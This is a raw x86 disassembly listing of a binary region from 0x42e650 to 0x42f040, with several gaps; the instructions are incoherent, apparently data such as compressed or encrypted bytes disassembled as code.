  42e650:	or     DWORD PTR [edx+0x5cd3a6df],0x8861c7f1
  42e65a:	mov    edi,fs
  42e65c:	dec    ebx
  42e65d:	pop    es
  42e65e:	sbb    ecx,DWORD PTR [eax+0x5]
  42e661:	push   edx
  42e662:	cmp    DWORD PTR [ebp+0x1c5a2427],esp
  42e668:	push   cs
  42e669:	xor    eax,0x50ad5a56
  42e66f:	jecxz  0x42e6ae
  42e671:	retf   0x8b10
  42e674:	xlat   BYTE PTR ds:[ebx]
  42e675:	mov    WORD PTR [edx],fs
  42e677:	jmp    0x6c597a0d
  42e67c:	adc    DWORD PTR [ebx+0x39a8b0],0xffffffb4
  42e683:	rcl    DWORD PTR [eax+0x1408811e],1
  42e689:	xor    al,0xa
  42e68b:	lock xor eax,0xaa5dbf8d
  42e691:	cmp    DWORD PTR [ecx+0x48],edi
  42e694:	push   es
  42e695:	enter  0x4c8e,0x5a
  42e699:	sahf   
  42e69a:	adc    al,0x7
  42e69c:	sti    
  42e69d:	cmp    dh,BYTE PTR [ebp+eax*2-0xe17a79b]
  42e6a4:	and    eax,0xb7878a09
  42e6a9:	std    
  42e6aa:	cmp    esp,DWORD PTR [ebp-0x6b]
  42e6ad:	push   eax
  42e6ae:	rol    BYTE PTR ds:0x6bb126b6,0xe
  42e6b5:	mov    ah,0x1
  42e6b7:	push   esp
  42e6b8:	xchg   esp,eax
  42e6b9:	fistp  QWORD PTR [esi+0x3d]
  42e6bc:	dec    ecx
  42e6bd:	inc    ecx
  42e6be:	je     0x42e69f
  42e6c0:	xor    DWORD PTR cs:[ebx-0x59],edx
  42e6c4:	cli    
  42e6c5:	iret   
  42e6c6:	pop    ebx
  42e6c7:	pop    es
  42e6c8:	push   ebx
  42e6c9:	xchg   esi,eax
  42e6ca:	into   
  42e6cb:	dec    eax
  42e6cc:	xchg   edx,eax
  42e6cd:	sbb    BYTE PTR [edi+0x69],dl
  42e6d0:	clc    
  42e6d1:	jle    0x42e662
  42e6d3:	jle    0x42e713
  42e6d5:	cmp    DWORD PTR [ebp+0x74792dec],edx
  42e6db:	xchg   esp,eax
  42e6dc:	ffree  st(6)
  42e6de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6df:	fadd   st(0),st
  42e6e1:	in     eax,0x7e
  42e6e3:	pop    eax
  42e6e4:	shl    ah,cl
  42e6e6:	jp     0x42e700
  42e6e8:	loopne 0x42e761
  42e6ea:	fpatan 
  42e6ec:	and    eax,0xb50c756c
  42e6f1:	adc    BYTE PTR [ebx],cl
  42e6f3:	aam    0xb
  42e6f5:	xor    BYTE PTR ds:0xd19d394f,0x16
  42e6fc:	retf   
  42e6fd:	sub    DWORD PTR [ecx],ecx
  42e6ff:	enter  0x944f,0xdd
  42e703:	pushf  
  42e704:	cmp    bh,BYTE PTR [ebx-0x51259c84]
  42e70a:	push   eax
  42e70b:	pusha  
  42e70c:	outs   dx,DWORD PTR ds:[esi]
  42e70d:	mov    esi,DWORD PTR [edi+ecx*1-0x28]
  42e711:	xor    eax,0x465ac41
  42e716:	xchg   edx,eax
  42e717:	mov    ds:0xaa5233dd,al
  42e71c:	and    ch,BYTE PTR [edi]
  42e71e:	sti    
  42e71f:	gs jo  0x42e6f9
  42e722:	jg     0x42e741
  42e724:	in     eax,0x8
  42e726:	int3   
  42e727:	xor    al,0x58
  42e729:	inc    esp
  42e72a:	push   ebx
  42e72b:	call   0xede16f5c
  42e730:	xor    al,0xb3
  42e732:	pusha  
  42e733:	pop    es
  42e734:	cmp    ebx,DWORD PTR [ebx+0x4a]
  42e737:	jb     0x42e775
  42e739:	out    0x6a,eax
  42e73b:	xchg   esi,eax
  42e73c:	aam    0x14
  42e73e:	in     al,dx
  42e73f:	mov    al,0xc3
	...
  42e7b1:	add    BYTE PTR [eax],al
  42e7b3:	add    BYTE PTR [esi-0x62a06765],dl
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi-0x40f2aa8a]
  42e7c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7c2:	xor    DWORD PTR [edx],esp
  42e7c4:	shr    edx,1
  42e7c6:	add    DWORD PTR [eax],eax
  42e7c8:	cmc    
  42e7c9:	add    BYTE PTR [eax],al
  42e7cb:	add    dh,bl
  42e7cd:	xlat   BYTE PTR ds:[ebx]
  42e7ce:	ja     0x42e76e
  42e7d0:	popf   
  42e7d1:	cmp    esp,DWORD PTR [ebp-0xcb8805]
  42e7d7:	into   
  42e7d8:	dec    esi
  42e7d9:	add    ebx,edx
  42e7db:	mov    dl,0xdd
  42e7dd:	cli    
  42e7de:	add    BYTE PTR [ebx+ebx*1-0x74],dh
  42e7e2:	das    
  42e7e3:	push   DWORD PTR [edi-0x51]
  42e7e6:	call   0xadfbb3ee
  42e7eb:	jne    0x42e770
  42e7ed:	xchg   edi,eax
  42e7ee:	rol    ecx,1
  42e7f0:	rcl    BYTE PTR [esi+0x76],0x39
  42e7f4:	jno    0x42e78e
  42e7f6:	cwde   
  42e7f7:	inc    ecx
  42e7f8:	retf   0x953d
  42e7fb:	lods   eax,DWORD PTR ds:[esi]
  42e7fc:	lds    ebx,FWORD PTR [esi-0x28]
  42e7ff:	pusha  
  42e800:	fs cmp al,0x0
  42e803:	sahf   
  42e804:	loop   0x42e7bf
  42e806:	out    dx,al
  42e807:	arpl   WORD PTR [edx],si
  42e809:	or     BYTE PTR [ebp-0x2e],ah
  42e80c:	and    BYTE PTR [edx-0x4fe6b90c],ah
  42e812:	aad    0x9e
  42e814:	shl    bl,0x97
  42e817:	inc    edx
  42e818:	mov    ds:0x5d752b35,eax
  42e81d:	pushf  
  42e81e:	sbb    esp,edi
  42e820:	inc    eax
  42e821:	jge    0x42e823
  42e823:	cmp    al,0x28
  42e825:	xchg   edx,eax
  42e826:	adc    DWORD PTR [ebp+ebp*8+0x7dfe313b],edi
  42e82d:	mov    esp,0xeafc6678
  42e832:	sub    al,0xe0
  42e834:	and    al,0x80
  42e836:	mov    ebp,esp
  42e838:	ins    BYTE PTR es:[edi],dx
  42e839:	test   DWORD PTR [edi+edx*8-0x3257b7f],esp
  42e840:	dec    esp
  42e841:	into   
  42e842:	ret    0x95b2
  42e845:	ror    al,cl
  42e847:	(bad)  
  42e849:	jne    0x42e7d1
  42e84b:	aam    0xfc
  42e84d:	in     eax,0x1
  42e84f:	test   eax,0x268b9ac1
  42e854:	push   0xf88c1ce1
  42e859:	inc    esi
  42e85a:	sub    BYTE PTR [edx+0x4f],bh
  42e85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e85e:	ds sahf 
  42e860:	aam    0x20
  42e862:	sti    
  42e863:	inc    esi
  42e864:	dec    ecx
  42e865:	push   ds
  42e866:	jp     0x42e8c5
  42e868:	pop    eax
  42e869:	not    DWORD PTR [ebp+0x6b150e90]
  42e86f:	mov    dl,0x62
  42e871:	test   eax,0x1e523814
  42e876:	(bad)
  42e879:	out    dx,eax
  42e87a:	jnp    0x42e8f4
  42e87c:	outs   dx,BYTE PTR ds:[esi]
  42e87d:	push   edx
  42e87e:	or     BYTE PTR [ebx+0x2e],cl
  42e881:	push   edx
  42e882:	popa   
  42e883:	loope  0x42e840
  42e885:	lea    edx,[ebx]
  42e887:	pop    es
  42e888:	pop    edi
  42e889:	and    eax,0xa4f53430
  42e88e:	aam    0xf9
  42e890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e891:	pop    esi
  42e892:	push   ebx
  42e893:	mov    eax,ds:0x9a57216e
  42e898:	int    0x5a
  42e89a:	push   0x46f239dd
  42e89f:	adc    al,0xab
  42e8a1:	in     al,dx
  42e8a2:	mov    dl,0xf2
  42e8a4:	dec    esi
  42e8a5:	push   eax
  42e8a6:	ret    
  42e8a7:	push   ds
  42e8a8:	xchg   ecx,eax
  42e8a9:	int3   
  42e8aa:	int3   
  42e8ab:	div    DWORD PTR fs:[ebx-0x392f404c]
  42e8b2:	mov    al,0x79
  42e8b4:	cmp    al,0x4c
  42e8b6:	daa    
  42e8b7:	mov    bh,0x7d
  42e8b9:	retf   
  42e8ba:	bound  ecx,QWORD PTR [edi]
  42e8bc:	mov    al,ds:0x70eef41c
	...
  42e931:	add    BYTE PTR [eax],al
  42e933:	add    cl,bh
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0x9e
  42e941:	or     eax,0xebc66ff9
  42e946:	add    DWORD PTR [eax],eax
  42e948:	cmc    
  42e949:	add    BYTE PTR [eax],al
  42e94b:	add    BYTE PTR [ebp-0x4d],bh
  42e94e:	jle    0x42e93c
  42e950:	sbb    al,0xff
  42e952:	xchg   edi,eax
  42e953:	sbb    eax,DWORD PTR [esp+esi*1-0x66]
  42e957:	or     eax,0x14095d51
  42e95c:	pop    DWORD PTR [ecx+0x50af6493]
  42e962:	add    DWORD PTR [ecx],esi
  42e964:	jl     0x42e94c
  42e966:	xor    eax,0xa688398a
  42e96b:	scas   eax,DWORD PTR es:[edi]
  42e96c:	into   
  42e96d:	add    al,0x87
  42e96f:	outs   dx,DWORD PTR ds:[esi]
  42e970:	mov    al,0x70
  42e972:	sub    DWORD PTR [edi],0x57
  42e975:	adc    DWORD PTR [edi+0x5eec977],esi
  42e97b:	adc    dl,BYTE PTR [edx+0x32]
  42e97e:	repnz fimul WORD PTR [edi]
  42e981:	xor    cl,BYTE PTR [edx]
  42e983:	inc    ecx
  42e984:	imul   esi,DWORD PTR [edi],0x5087311d
  42e98a:	adc    eax,0xce966ddb
  42e98f:	jl     0x42e9db
  42e991:	lods   eax,DWORD PTR ds:[esi]
  42e992:	ror    BYTE PTR [esi-0x69c91f23],cl
  42e998:	not    DWORD PTR [edx-0x15]
  42e99b:	cs mov ah,0x1f
  42e99e:	scas   eax,DWORD PTR es:[edi]
  42e99f:	aas    
  42e9a0:	push   eax
  42e9a1:	adc    eax,0x2e92c027
  42e9a6:	imul   ecx,DWORD PTR [edx+edx*1-0x2d],0x637d093
  42e9ae:	aam    0xa8
  42e9b0:	mov    al,0xb1
  42e9b2:	xchg   edi,eax
  42e9b3:	cmp    ebp,DWORD PTR [ecx+0x2477be11]
  42e9b9:	push   0x2464cbdb
  42e9be:	jmp    0xb57:0x3086156f
  42e9c5:	fst    DWORD PTR [ecx+0x77]
  42e9c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9c9:	mov    al,ds:0xae16f497
  42e9ce:	pop    ss
  42e9cf:	cmp    ebx,DWORD PTR [eax-0x47d74310]
  42e9d5:	lods   al,BYTE PTR ds:[esi]
  42e9d6:	(bad)
  42e9db:	arpl   WORD PTR [edi-0x4e],ax
  42e9de:	inc    edx
  42e9df:	xchg   esp,eax
  42e9e0:	out    dx,al
  42e9e1:	sub    eax,DWORD PTR [ecx+0x5f]
  42e9e4:	clc    
  42e9e5:	loopne 0x42ea27
  42e9e7:	mov    cl,0x76
  42e9e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9ea:	ins    DWORD PTR es:[di],dx
  42e9ec:	cmc    
  42e9ed:	push   es
  42e9ee:	retf   
  42e9ef:	mov    eax,ds:0x4e41d2e2
  42e9f4:	pusha  
  42e9f5:	aam    0xd4
  42e9f7:	adc    edi,esi
  42e9f9:	arpl   WORD PTR [edi+0x6e9d9f98],bp
  42e9ff:	sub    eax,0xf3b01f18
  42ea04:	gs scas al,BYTE PTR es:[edi]
  42ea06:	test   BYTE PTR [eax+eax*4+0x60],al
  42ea0a:	out    dx,al
  42ea0b:	push   edi
  42ea0c:	sbb    bl,BYTE PTR [edi+edx*4+0x7d]
  42ea10:	xchg   edi,eax
  42ea11:	leave  
  42ea12:	hlt    
  42ea13:	push   ebp
  42ea14:	mov    eax,ds:0xb2e1553d
  42ea19:	inc    edi
  42ea1a:	pop    esp
  42ea1b:	or     eax,0xf086ae77
  42ea20:	jne    0x42ea83
  42ea22:	pop    eax
  42ea23:	nop
  42ea24:	pop    ebx
  42ea25:	adc    esp,DWORD PTR [edx-0x74]
  42ea28:	sub    DWORD PTR [edi],ebp
  42ea2a:	dec    edi
  42ea2b:	push   esi
  42ea2c:	mov    edx,0x3c71ff4
  42ea31:	ror    DWORD PTR [edi],cl
  42ea33:	mov    ah,0x77
  42ea35:	outs   dx,DWORD PTR ds:[esi]
  42ea36:	xchg   ebp,eax
  42ea37:	sar    DWORD PTR [esi-0x41],1
  42ea3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea3b:	push   ebp
  42ea3c:	inc    ebx
  42ea3d:	fwait
  42ea3e:	icebp  
  42ea3f:	and    cl,BYTE PTR [eax+eax*1+0x0]
	...
  42eab3:	add    BYTE PTR [eax-0x2093e086],dh
  42eab9:	ins    DWORD PTR es:[edi],dx
  42eaba:	repz dec BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	pop    edx
  42eac1:	ins    BYTE PTR es:[edi],dx
  42eac2:	gs push esp
  42eac4:	mov    ebx,0xf50001ec
  42eac9:	add    BYTE PTR [eax],al
  42eacb:	add    BYTE PTR [eax],bh
  42eacd:	jnp    0x42eb4d
  42eacf:	pop    es
  42ead0:	mov    esp,0x68b0ed5a
  42ead5:	mov    dl,0x95
  42ead7:	push   ecx
  42ead8:	push   esp
  42ead9:	addr16 stc 
  42eadb:	data16 mov ds:0xf5fe9fad,al
  42eae1:	iret   
  42eae2:	sub    al,0xfa
  42eae4:	dec    esp
  42eae5:	ror    BYTE PTR [edx+edi*4],0xea
  42eae9:	push   edx
  42eaea:	sbb    BYTE PTR [eax-0x41f9855d],bh
  42eaf0:	mov    eax,ds:0xc01320e5
  42eaf5:	mov    dh,0x7c
  42eaf7:	jo     0x42eb47
  42eaf9:	rcr    al,1
  42eafb:	dec    edx
  42eafc:	aam    0xb8
  42eafe:	mov    ecx,0xa0d81c02
  42eb03:	xchg   esi,eax
  42eb04:	push   edx
  42eb05:	mov    esp,DWORD PTR [ebx-0x393b077b]
  42eb0b:	(bad)  
  42eb0c:	pop    ss
  42eb0d:	jmp    0x8808f1cb
  42eb12:	mov    esp,0x521eb490
  42eb17:	ins    BYTE PTR es:[edi],dx
  42eb18:	push   edi
  42eb19:	inc    esi
  42eb1a:	or     DWORD PTR [esi],eax
  42eb1c:	mov    BYTE PTR [esi-0x65c27728],cl
  42eb22:	pop    edx
  42eb23:	add    ebx,DWORD PTR [edi+edx*1-0x11]
  42eb27:	cmp    eax,0xa793b46a
  42eb2c:	xchg   ecx,eax
  42eb2d:	out    dx,eax
  42eb2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb2f:	xchg   BYTE PTR [edi],bh
  42eb31:	arpl   WORD PTR [ecx-0x7e],ax
  42eb34:	(bad)  
  42eb35:	fsub   DWORD PTR [eax+0x7a]
  42eb38:	dec    edi
  42eb39:	xchg   esi,eax
  42eb3a:	cmp    ebx,DWORD PTR [ebx+0x5a3fe453]
  42eb40:	add    BYTE PTR [eax-0x101dcbc],dh
  42eb46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb47:	lods   eax,DWORD PTR ds:[esi]
  42eb48:	jne    0x42eacd
  42eb4a:	xor    bh,al
  42eb4c:	aaa    
  42eb4d:	adc    dh,BYTE PTR ds:0x2d4e0182
  42eb53:	mov    ebx,0x9f26d0b3
  42eb58:	or     BYTE PTR [eax-0x60b70967],bh
  42eb5e:	cmp    cl,dl
  42eb60:	out    dx,al
  42eb61:	(bad)  
  42eb62:	sbb    eax,edi
  42eb64:	push   es
  42eb65:	xor    al,0xa4
  42eb67:	cs pop ss
  42eb69:	sbb    esi,DWORD PTR [eax+0x4b8eb0d0]
  42eb6f:	repz xor al,0xd5
  42eb72:	sbb    DWORD PTR [edx],ebx
  42eb74:	mov    al,ds:0x390eafdc
  42eb79:	imul   eax,DWORD PTR [ebx],0x58
  42eb7c:	jge    0x42ebe2
  42eb7e:	jo     0x42eb19
  42eb80:	pusha  
  42eb81:	add    edx,DWORD PTR [esi]
  42eb83:	pop    ds
  42eb84:	(bad)
  42eb87:	mov    ds:0xdbca256e,al
  42eb8c:	out    0xab,al
  42eb8e:	sbb    eax,0x7a4b5af6
  42eb93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb94:	pop    ss
  42eb95:	clc    
  42eb96:	stc    
  42eb97:	std    
  42eb98:	mov    edi,0xecfffdfc
  42eb9d:	fsub   DWORD PTR [edi]
  42eb9f:	cs push esp
  42eba1:	in     eax,0xe0
  42eba3:	mov    cs,WORD PTR [eax+0x11055928]
  42eba9:	xor    DWORD PTR [eax],ecx
  42ebab:	jle    0x42ebbf
  42ebad:	adc    ah,BYTE PTR [esp+eax*1]
  42ebb0:	inc    edi
  42ebb1:	adc    eax,0xcbc80d40
  42ebb6:	xor    eax,0x66fde949
  42ebbb:	out    dx,al
  42ebbc:	and    BYTE PTR [eax+0x6bdca8],ah
	...
  42ec32:	add    BYTE PTR [eax],al
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4+0x6c4e6669]
  42ec43:	xchg   BYTE PTR [eax-0xafffe13],dh
  42ec49:	add    BYTE PTR [eax],al
  42ec4b:	add    BYTE PTR [ebp+0xe274efb],dh
  42ec51:	(bad)  
  42ec52:	cli    
  42ec53:	jg     0x42ec28
  42ec55:	(bad)  
  42ec56:	jmp    0xca85e794
  42ec5b:	aas    
  42ec5c:	arpl   WORD PTR [ecx+0x1f56c951],si
  42ec62:	or     edx,DWORD PTR [edx+edi*1-0x74b2435]
  42ec69:	mov    bl,0x99
  42ec6b:	xor    edx,DWORD PTR [edx+eiz*2]
  42ec6e:	cs (bad) 
  42ec70:	packuswb mm1,QWORD PTR [ebx]
  42ec73:	sub    DWORD PTR [ebx-0x50],0xfb27ccb5
  42ec7a:	push   ss
  42ec7b:	or     eax,0x541d14f3
  42ec80:	cli    
  42ec81:	mov    al,0x66
  42ec83:	jo     0x42ecfe
  42ec85:	test   DWORD PTR [ebx-0x407dc48],ecx
  42ec8b:	jne    0x42ec60
  42ec8d:	pop    ebx
  42ec8e:	mov    bh,0xe4
  42ec90:	push   0x2a71708e
  42ec95:	jg     0x42ec36
  42ec97:	repnz sbb eax,0x20b1bcbd
  42ec9d:	dec    eax
  42ec9e:	cmp    BYTE PTR [eax-0x9],dl
  42eca1:	mov    bl,0x1e
  42eca3:	fist   DWORD PTR [ecx]
  42eca5:	mov    gs,WORD PTR [ecx]
  42eca7:	hlt    
  42eca8:	xchg   ebx,eax
  42eca9:	fnstenv [ebx]
  42ecab:	lods   eax,DWORD PTR ds:[esi]
  42ecac:	jmp    0xd3d21e7a
  42ecb1:	lahf   
  42ecb2:	cmp    BYTE PTR [edi+0x29],bh
  42ecb5:	neg    DWORD PTR [ecx]
  42ecb7:	fild   DWORD PTR [ebp-0x30]
  42ecba:	xchg   ecx,eax
  42ecbb:	mov    ah,0xb4
  42ecbd:	sti    
  42ecbe:	test   ebp,ebx
  42ecc0:	cli    
  42ecc1:	adc    bl,BYTE PTR ds:0x2f7043a
  42ecc7:	xchg   ebp,eax
  42ecc8:	lds    edi,FWORD PTR [ecx+0x9]
  42eccb:	adc    DWORD PTR [ebp+0x7bcd7793],ebp
  42ecd1:	outs   dx,DWORD PTR ds:[esi]
  42ecd2:	pop    esi
  42ecd3:	fist   DWORD PTR [eax-0x2d2421aa]
  42ecd9:	jo     0x42ecc7
  42ecdb:	std    
  42ecdc:	mov    al,0xe7
  42ecde:	cmp    BYTE PTR [ebx],ch
  42ece0:	mov    eax,edi
  42ece2:	cmp    eax,0xfa27d13f
  42ece7:	lock push es
  42ece9:	mov    ecx,0xe56e9e33
  42ecee:	and    eax,0x8efed6b9
  42ecf3:	mov    cl,BYTE PTR [eax+0x3c]
  42ecf6:	mov    ah,0x19
  42ecf8:	sbb    eax,0x113c80eb
  42ecfd:	fnsave [ecx-0x22]
  42ed00:	stos   DWORD PTR es:[edi],eax
  42ed01:	sbb    ah,BYTE PTR [edx-0x17e1c2fb]
  42ed07:	and    BYTE PTR [edi],ch
  42ed09:	in     al,dx
  42ed0a:	inc    ebx
  42ed0b:	daa    
  42ed0c:	stos   BYTE PTR es:[edi],al
  42ed0d:	push   ss
  42ed0e:	pop    es
  42ed0f:	dec    ebp
  42ed10:	popf   
  42ed11:	rcr    edi,0xd9
  42ed14:	arpl   WORD PTR [edi-0x6f3cc11d],di
  42ed1a:	add    al,0x1f
  42ed1c:	xchg   edi,esp
  42ed1e:	push   eax
  42ed1f:	pop    ds
  42ed20:	out    0xdb,al
  42ed22:	dec    BYTE PTR [ecx+0x6b]
  42ed25:	jb     0x42ed6a
  42ed27:	add    bl,ah
  42ed29:	shl    DWORD PTR [edi+0x4cdca903],1
  42ed2f:	add    DWORD PTR [esi],esp
  42ed31:	sbb    eax,0x2153ff7a
  42ed36:	sub    eax,0x81481b42
  42ed3b:	out    0x25,eax
  42ed3d:	and    esp,DWORD PTR [esi+0x8a88]
	...
  42edb3:	add    dh,ah
  42edb5:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0x72caa796
  42edc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edc5:	out    dx,al
  42edc6:	add    DWORD PTR [eax],eax
  42edc8:	cmc    
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [edi+0x4d],ah
  42edce:	xchg   esi,eax
  42edcf:	add    DWORD PTR [esi-0x5fa2b982],edx
  42edd5:	lds    edi,FWORD PTR [eax+0x11]
  42edd8:	out    dx,al
  42edd9:	enter  0xddd3,0xb3
  42eddd:	or     eax,0x976bdbef
  42ede2:	loope  0x42ee56
  42ede4:	retf   
  42ede5:	test   eax,0xe706c6c1
  42edea:	outs   dx,DWORD PTR ds:[esi]
  42edeb:	sub    BYTE PTR [esi],dh
  42eded:	(bad)  
  42edee:	mov    dl,0xe0
  42edf0:	inc    ecx
  42edf1:	arpl   WORD PTR ds:0xa87017a1,dx
  42edf7:	and    esi,esi
  42edf9:	jnp    0x42ee58
  42edfb:	add    ah,dh
  42edfd:	cli    
  42edfe:	cld    
  42edff:	cli    
  42ee00:	and    esi,eax
  42ee02:	push   cs
  42ee03:	pusha  
  42ee04:	ss inc edx
  42ee06:	retf   0xdd8d
  42ee09:	jmp    0x42ee62
  42ee0b:	aas    
  42ee0c:	xchg   edx,eax
  42ee0d:	sbb    esp,DWORD PTR [eax]
  42ee0f:	cmp    al,0xff
  42ee11:	(bad)  
  42ee12:	mov    cl,0xad
  42ee14:	inc    ecx
  42ee15:	dec    ecx
  42ee16:	or     DWORD PTR [ecx+0x12],ebx
  42ee19:	(bad)  
  42ee1a:	(bad)  
  42ee1b:	and    al,0xd6
  42ee1d:	call   0x7e4bcfa8
  42ee22:	jbe    0x42ee5c
  42ee24:	icebp  
  42ee25:	call   0xba22:0x2a73dc92
  42ee2c:	xchg   BYTE PTR [ebp+0x7eea477f],cl
  42ee32:	in     eax,dx
  42ee33:	jne    0x42ee6a
  42ee35:	dec    ebx
  42ee36:	out    0x75,eax
  42ee38:	and    edx,ebp
  42ee3a:	adc    al,0x55
  42ee3c:	push   es
  42ee3d:	pop    ss
  42ee3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee3f:	int3   
  42ee40:	pop    esi
  42ee41:	pop    eax
  42ee42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee43:	push   cs
  42ee44:	pop    es
  42ee45:	mov    ecx,0x61aa4bf9
  42ee4a:	leave  
  42ee4b:	les    esi,FWORD PTR ds:0xa13ffd37
  42ee51:	imul   edi,DWORD PTR [edx+0x45],0x75
  42ee55:	dec    ecx
  42ee56:	cld    
  42ee57:	pop    ebx
  42ee58:	in     eax,dx
  42ee59:	fst    QWORD PTR [ecx-0x58]
  42ee5c:	stos   BYTE PTR es:[edi],al
  42ee5d:	add    ebp,0x62e2727d
  42ee63:	add    eax,DWORD PTR [eax]
  42ee65:	cmp    eax,0x56c9d2ee
  42ee6a:	or     dh,0xe8
  42ee6d:	cmp    al,0x45
  42ee6f:	add    ebp,ebp
  42ee71:	jle    0x42ee53
  42ee73:	mov    ss,WORD PTR [eax]
  42ee75:	dec    edi
  42ee76:	or     eax,0x5553b51f
  42ee7b:	popf   
  42ee7c:	mov    edi,0x82441f17
  42ee81:	out    dx,al
  42ee82:	push   esi
  42ee83:	jo     0x42ee2b
  42ee85:	out    0xa7,al
  42ee87:	sahf   
  42ee88:	(bad)
  42ee8b:	popf   
  42ee8c:	cs push edi
  42ee8e:	das    
  42ee8f:	mov    eax,ds:0x688da1cc
  42ee94:	sar    DWORD PTR [edx+0x6dc2a3cf],cl
  42ee9a:	cmc    
  42ee9b:	and    BYTE PTR ds:0x1102f8cf,bl
  42eea1:	fldcw  WORD PTR [eax-0x16]
  42eea4:	sbb    dl,BYTE PTR [ecx-0x70e1c594]
  42eeaa:	adc    esi,DWORD PTR [ebx-0x2830b125]
  42eeb0:	and    DWORD PTR [esi-0x5b695485],ecx
  42eeb6:	inc    esp
  42eeb7:	mov    eax,ds:0xd8578ac7
  42eebc:	loop   0x42eeb6
  42eebe:	outs   dx,BYTE PTR ds:[esi]
  42eebf:	xchg   edi,eax
  42eec0:	fld    QWORD PTR [eax]
	...
  42ef32:	add    BYTE PTR [eax],al
  42ef34:	add    bh,dh
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz cmp BYTE PTR [edx-0x1065cb81],ch
  42ef46:	add    DWORD PTR [eax],eax
  42ef48:	cmc    
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    ah,bh
  42ef4d:	fucomp st(2)
  42ef4f:	mov    ah,0xd0
  42ef51:	repz not BYTE PTR [edx+0x12e73bc]
  42ef58:	pop    esi
  42ef59:	inc    esp
  42ef5a:	pop    edx
  42ef5b:	dec    esi
  42ef5c:	lods   eax,DWORD PTR ds:[esi]
  42ef5d:	ror    BYTE PTR [ecx+0x5],0x5d
  42ef61:	mov    eax,ds:0x2542aca3
  42ef66:	cmp    ah,BYTE PTR [edi+0x72]
  42ef69:	jg     0x42ef9c
  42ef6b:	ja     0x42ef8e
  42ef6d:	sbb    eax,DWORD PTR [ebx]
  42ef6f:	call   0x2248:0x79d975f6
  42ef76:	(bad)  
  42ef77:	push   edx
  42ef78:	push   esi
  42ef79:	push   ss
  42ef7a:	and    al,0x9b
  42ef7c:	leave  
  42ef7d:	loop   0x42ef0d
  42ef7f:	jbe    0x42ef2b
  42ef81:	test   BYTE PTR [ebx],0xf9
  42ef84:	fisttp QWORD PTR [edi]
  42ef86:	adc    DWORD PTR [eax-0x5e],0x2234653f
  42ef8d:	and    ah,0xeb
  42ef90:	and    dh,al
  42ef92:	jns    0x42ef42
  42ef94:	xchg   BYTE PTR [edx-0x7df380b3],dl
  42ef9a:	xor    BYTE PTR [esi],0x6d
  42ef9d:	mov    edi,0xc56197de
  42efa2:	add    DWORD PTR [ebp+0x4280d0f5],edi
  42efa8:	push   ss
  42efa9:	mov    ds:0x4ca81cf9,al
  42efae:	xchg   edi,eax
  42efaf:	inc    edi
  42efb0:	sub    ebx,eax
  42efb2:	ds add edx,edx
  42efb5:	sub    ebx,esp
  42efb7:	aad    0xc2
  42efb9:	retf   0xfd22
  42efbc:	mov    al,ds:0x779da379
  42efc1:	mov    WORD PTR [edx+0x4f],?
  42efc4:	sub    BYTE PTR [eax+0x4411373c],0xdb
  42efcb:	pop    esp
  42efcc:	fcmovne st,st(5)
  42efce:	lods   eax,DWORD PTR ds:[esi]
  42efcf:	push   ecx
  42efd1:	jno    0x42f03f
  42efd3:	call   FWORD PTR [ebx-0x3b]
  42efd6:	push   ebp
  42efd7:	cdq    
  42efd8:	and    dh,BYTE PTR [eax-0x41]
  42efdb:	mov    dl,0xa0
  42efdd:	sub    ch,BYTE PTR [eax-0x3e221da9]
  42efe3:	aaa    
  42efe4:	add    eax,0x51431ce9
  42efe9:	push   0xffffffd8
  42efeb:	mov    cl,0x16
  42efed:	add    eax,0x55acd47c
  42eff2:	mov    ebp,0x42761496
  42eff7:	repz pushf 
  42eff9:	or     ebx,DWORD PTR [ecx]
  42effb:	inc    esp
  42effc:	cli    
  42effd:	add    ah,bl
  42efff:	cwde   
  42f000:	xchg   ebx,eax
  42f001:	push   ebx
  42f002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f003:	cmp    al,0x8c
  42f005:	sub    eax,DWORD PTR [eax]
  42f007:	push   edx
  42f008:	imul   esi,DWORD PTR [ebx],0xd0e16f6
  42f00e:	adc    eax,0xb27d2bf6
  42f013:	lock inc ecx
  42f015:	push   ss
  42f016:	fisttp WORD PTR [ebx-0x1d3ed572]
  42f01c:	cwde   
  42f01d:	xor    eax,0x85cc4923
  42f022:	out    0x5e,eax
  42f024:	xchg   esp,eax
  42f025:	sub    eax,0xbc8e9f70
  42f02a:	push   esi
  42f02b:	iret   
  42f02c:	cmp    bl,ah
  42f02e:	and    bl,dl
  42f030:	sub    al,0xb3
  42f032:	and    DWORD PTR [edi+0x714c0ff5],0xffffffe8
  42f039:	cmp    al,BYTE PTR [ebx-0x73a6ba1a]
  42f03f:	iret   
  42f040:	push   ebp
	...
